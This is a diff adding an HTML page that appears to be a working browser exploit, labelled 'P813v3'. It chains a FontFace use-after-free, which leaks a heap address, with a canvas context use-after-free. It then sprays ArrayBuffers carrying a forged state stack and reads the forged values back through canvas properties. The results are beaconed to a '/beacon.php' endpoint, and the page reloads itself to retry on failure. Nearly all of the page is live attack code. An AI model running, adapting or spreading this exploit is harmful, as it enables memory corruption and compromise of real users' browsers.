@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P813v3</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P813v3 — fixed AB(768) reclaim (no unforged flush)</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('0000000000000000'+_bu[0].toString(16)).slice(-16);}
+
+/* Deferred beacon queue — flush ONLY after reads */
+var _bq=[];
+function bn(t,d){_bq.push([t,d||'']);}
+function flushBn(){
+  for(var i=0;i<_bq.length;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon.php?tag=P813v3-'+encodeURIComponent(_bq[i][0])+'&data='+encodeURIComponent(String(_bq[i][1]).slice(0,900))+'&t='+Date.now(),false);
+      x.send();
+    }catch(e){}
+  }
+  _bq=[];
+}
+
+/* Async image beacon — doesn't block, doesn't compete for 768B slot */
+function imgBn(t){
+  var img=new Image();
+  img.src='/beacon.php?tag=P813v3-'+t+'&t='+Date.now();
+}
+
+/* ========== PHASE 1: FontFace UAF ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    imgBn('FONT-MISS');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  var bv=new DataView(fabs[bestI]);
+  var q11lo=bv.getUint32(0x58,true);
+  var q11hi=bv.getUint32(0x5C,true);
+  if(q11hi===0){
+    imgBn('FONT-BAD');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+
+  /* Write markers at State field offsets in FontFace AB */
+  var fabDV=new DataView(fabs[bestI]);
+  fabDV.setFloat64(0, 0.5, true);         /* globalAlpha: State+0 */
+  fabDV.setFloat64(48, 1234.5678, true);   /* lineWidth: State+48 */
+  fabDV.setFloat64(56, 5678.1234, true);   /* miterLimit candidate: State+56 */
+  fabDV.setFloat64(64, 9876.5432, true);   /* miterLimit candidate: State+64 */
+
+  /* Async beacon — just a GET image, no response buffer competition */
+  imgBn('FONT-OK_H='+Hstr);
+
+  /* ========== PHASE 2: Canvas UAF ========== */
+  /* CRITICAL: zero sync allocations between UAF free and AB spray+forge */
+
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    imgBn('UAF-FAIL');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  /* ========== PHASE 3: AB(768) spray + forge (NO separate flush!) ========== */
+  /*
+   * Bug fix: P813/v2 had 50 "flush" ABs that reclaimed the slot
+   * but weren't forged → null m_buffer → crash.
+   * Now: ALL ABs are forged immediately after allocation.
+   */
+  var SPRAY=500;
+  var abs=[];
+  var dvs=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    /* Forge m_stateStack IMMEDIATELY in every AB */
+    dv.setUint32(112, H_lo, true);   /* m_buffer lo */
+    dv.setUint32(116, H_hi, true);   /* m_buffer hi */
+    dv.setUint32(120, 1, true);      /* m_capacity */
+    dv.setUint32(124, 1, true);      /* m_size */
+    abs.push(ab);
+    dvs.push(dv);
+  }
+
+  /* ========== PHASE 4: READ (the moment of truth) ========== */
+  var R={};
+  try{
+    R.lw=innerCtx.lineWidth;
+    R.lwHex=f2h(R.lw);
+    R.ok=true;
+  }catch(e){
+    R.ok=false;
+    R.err=e.message;
+  }
+
+  if(R.ok){
+    try{R.ml=innerCtx.miterLimit;R.mlHex=f2h(R.ml);}catch(e){R.mlE=e.message;}
+    try{R.ga=innerCtx.globalAlpha;R.gaHex=f2h(R.ga);}catch(e){R.gaE=e.message;}
+    try{
+      var t=innerCtx.getTransform();
+      R.tf=[f2h(t.a),f2h(t.b),f2h(t.c),f2h(t.d),f2h(t.e),f2h(t.f)];
+    }catch(e){R.tfE=e.message;}
+    try{R.fs=innerCtx.fillStyle;}catch(e){R.fsE=e.message;}
+    try{R.ss=innerCtx.strokeStyle;}catch(e){R.ssE=e.message;}
+  }
+
+  /* ========== PHASE 5: BEACON EVERYTHING ========== */
+  bn('H',Hstr+'|nz='+bestNz);
+
+  if(!R.ok){
+    bn('CRASH','err='+(R.err||'unknown'));
+    flushBn();
+    log('CRASH at lineWidth read. H='+Hstr);
+    log('The AB spray likely missed the freed slot.');
+    log('Reloading to retry...');
+    setTimeout(function(){location.reload();},500);
+    return;
+  }
+
+  var lwM=(R.lw===1234.5678);
+  var mlM1=(R.ml===9876.5432);
+  var mlM2=(R.ml===5678.1234);
+
+  bn('LW','val='+R.lw+'|hex='+R.lwHex+'|match='+lwM);
+  bn('ML','val='+R.ml+'|hex='+R.mlHex+'|m1='+mlM1+'|m2='+mlM2);
+  if(R.ga!==undefined) bn('GA','val='+R.ga+'|hex='+R.gaHex);
+  if(R.tf) bn('TF',R.tf.join('|'));
+  if(R.fs!==undefined) bn('FS',R.fs);
+  if(R.ss!==undefined) bn('SS',R.ss);
+
+  if(lwM){
+    bn('WIN','FORGED_STATESTACK_WORKS');
+    log('*** FORGED STATESTACK CONFIRMED ***');
+  }else if(R.lw===1||R.lw===0){
+    bn('DEFAULT','lw='+R.lw+'|reclaim_missed_or_old_data');
+    log('Got default lineWidth='+R.lw+' — AB may not have reclaimed the slot');
+  }else{
+    bn('UNKNOWN','lw='+R.lw+'|hex='+R.lwHex);
+    log('Unexpected lineWidth — checking if it looks like heap data');
+  }
+
+  log('lineWidth='+R.lw+' hex='+R.lwHex+' match='+lwM);
+  log('miterLimit='+R.ml+' match56='+mlM2+' match64='+mlM1);
+  if(R.ga!==undefined) log('globalAlpha='+R.ga);
+  if(R.tf) log('transform: '+R.tf.join(', '));
+  if(R.fs!==undefined) log('fillStyle='+R.fs);
+  if(R.ss!==undefined) log('strokeStyle='+R.ss);
+  log('H='+Hstr);
+
+  /* Clean up */
+  innerCtx=null;
+  for(var c=0;c<dvs.length;c++){
+    dvs[c].setFloat64(112,0,true);
+    dvs[c].setUint32(120,0,true);
+    dvs[c].setUint32(124,0,true);
+  }
+
+  bn('DONE','ok');
+  flushBn();
+  log('=== P813v3 DONE ===');
+},600);
+</script></body></html>
